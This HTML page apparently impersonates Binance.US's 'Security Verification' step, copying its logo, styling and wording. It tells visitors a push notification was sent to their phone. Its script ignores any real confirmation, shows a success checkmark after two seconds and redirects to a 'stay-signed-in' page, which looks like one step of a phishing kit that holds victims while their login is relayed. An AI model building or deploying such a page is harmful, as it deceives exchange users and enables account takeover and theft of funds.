<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - Binance</title>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            margin-top: 52px;
        }

        .container {
            width: 425px;
            height: 649px;
            background: #fff;
            border-radius: 24px;
            padding: 40px;
            border: 1px solid #eaecef;
            display: flex;
            flex-direction: column;
        }

        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon .binance-logo {
            width: 32px;
            height: 28px;
        }

        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: rgb(240, 185, 11);
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 32px;
            color: #1e2329;
        }

        .verification-icon {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
            position: relative;
        }

        .verification-icon svg {
            width: 120px;
            height: 120px;
        }

        .checkmark {
            position: absolute;
            bottom: -4px;
            right: -4px;
            width: 32px;
            height: 32px;
            display: none;
        }

        .text-block {
            font-size: 13px;
            color: #5e6673;
            margin-bottom: 24px;
        }

        .text-block strong {
            display: block;
            margin-bottom: 8px;
            color: #1e2329;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #FCD535;
            color: #000;
            font-weight: 600;
            font-size: 14px;
            border: none;
            border-radius: 11px;
            cursor: not-allowed;
            margin-bottom: 25px;
            opacity: 0.6;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .alt-methods {
            font-size: 13px;
            color: #C99400;
            text-align: center;
            text-decoration: none;
        }

        .bottom-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            padding: 16px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            font-size: 12px;
            color: #5e6673;
        }

        .bottom-footer svg {
            width: 16px;
            height: 16px;
            margin-right: 6px;
        }

        .bottom-footer a {
            color: #5e6673;
            text-decoration: none;
        }

        .bottom-footer a:hover {
            color: #1e2329;
        }

        .checkmark {
            position: absolute;
            bottom: -12px;
            left: 50%;
            transform: translateX(-50%);
            width: 32px;
            height: 32px;
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <div class="logo-icon">
            <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg" class="binance-logo">
                <g fill="#f3ba2f">
                    <path d="m38.73 53.2 24.59-24.58 24.6 24.6 14.3-14.31-38.9-38.91-38.9 38.9z"/>
                    <path d="m0 63.31 14.3-14.31 14.31 14.31-14.31 14.3z"/>
                    <path d="m38.73 73.41 24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88z"/>
                    <path d="m98 63.31 14.3-14.31 14.31 14.3-14.31 14.32z"/>
                    <path d="m77.83 63.3-14.51-14.52-10.73 10.73-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/>
                </g>
            </svg>
        </div>
        <div class="logo-text">BINANCE.US</div>
    </div>
    <div class="title">Security Verification</div>
    <div class="verification-icon">
        <svg class="bn-svg" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
            <path opacity="0.15" fill-rule="evenodd" clip-rule="evenodd" d="M84 8H12v56l36 24 36-24V8zM71.999 30H62V16H34v48h28V42h9.999v-4H62v-4h9.999v-4z" fill="#929AA5"></path>
            <path opacity="0.5" fill-rule="evenodd" clip-rule="evenodd" d="M62 16H34v4h28v-4zm0 44H34v4h28v-4z" fill="#929AA5"></path>
            <path fill-rule="evenodd" clip-rule="evenodd" d="M47.998 26h28v20H63.995l-8 8v-8H48V26zm4 4h20v4h-20v-4zm0 8h20v4h-20v-4z" fill="#F0B90B"></path>
        </svg>
        <svg id="checkmark" class="checkmark" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M72 56c-8.836 0-16 7.163-16 16 0 8.836 7.164 16 16 16 8.837 0 16-7.164 16-16 0-8.837-7.163-16-16-16zm-2.12 23.963l2.828-2.828 8.485-8.486-2.828-2.828-8.486 8.485-4.243-4.242-2.828 2.828 7.071 7.071z" fill="#2EE39D"></path>
        </svg>
    </div>
    <div class="text-block">
        <strong>Open Binance app on your phone</strong>
        Binance has sent a notification to your phone. Open your Binance App and confirm on the prompt to verify it's you.
    </div>
    <button class="submit-btn" id="resendBtn">Resend <span id="timer">(20s)</span></button>
    <a href="#" class="alt-methods">Use Other Methods to Complete Verification</a>
</div>
<div class="bottom-footer">
    <svg class="bn-svg css-166786i" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M20.6 18.26h-1.545a1 1 0 00-.767.358l-.075.103-.713 1.111-.713-1.111-.075-.103a1 1 0 00-.767-.358H14.4V14.4h6.2v3.86z" fill="currentColor"></path>
        <path d="M1.644 12.025C1.644 6.268 6.312 1.6 12.07 1.6c4.383 0 9.143 3.146 10.165 8.738a.9.9 0 01-1.77.324C19.61 5.992 15.653 3.4 12.07 3.4a8.625 8.625 0 00-1.107 17.18h.104a.9.9 0 01.348 1.729c-.005.002-.01.007-.015.01a.907.907 0 01-.331.08l-.038.001h-.026a.896.896 0 01-.083-.005l-.044-.003-.05-.006a1.265 1.265 0 01-.121-.026c-5.114-.668-9.063-5.039-9.063-10.335z" fill="currentColor"></path>
        <path d="M20.634 7.67l.091.005a.9.9 0 010 1.79l-.091.006H3.367a.9.9 0 010-1.801h17.267zM10.5 14.53l.092.004a.9.9 0 010 1.791l-.092.005H3.367a.9.9 0 010-1.8H10.5z" fill="currentColor"></path>
    </svg>
    <a href="#">English</a>
    <a href="#">Cookies</a>
    <a href="#">Terms</a>
    <a href="#">Privacy</a>
</div>
<script>
    const timerEl = document.getElementById('timer');
    const checkmark = document.getElementById('checkmark');
    let timeLeft = 20;

    const interval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = `(${timeLeft}s)`;
        if (timeLeft === 18) {
            checkmark.style.display = 'block';
            clearInterval(interval);
            setTimeout(() => {
                window.location.href = 'stay-signed-in';
            }, 2000);
        }
    }, 1000);
</script>
</body>
</html>
